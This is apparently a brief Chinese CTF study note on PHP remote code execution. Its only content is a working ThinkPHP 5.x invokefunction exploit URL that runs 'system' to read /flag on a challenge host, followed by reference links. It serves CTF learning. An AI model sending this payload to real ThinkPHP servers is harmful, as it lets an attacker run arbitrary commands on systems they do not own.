---
title: CTF中的PHP RCE 知识点
date: 2023-01-05 12:46:39
keywords: ctf, rce, php rce
description:  
---



```sh
http://61.147.171.105:50474/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag
```



## 参考资料

1. [ThinkPHP5.x远程命令执行漏洞分析](https://blog.riskivy.com/thinkphp5-x%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/)
2. [攻防世界 php_rce 题目](https://adworld.xctf.org.cn/challenges/details?hash=fab9bb4e-12e7-4158-b971-f560fad8891a_2&task_category_id=3)
3. [xray 的官方使用文档](https://docs.xray.cool/#/tutorial/prepare)
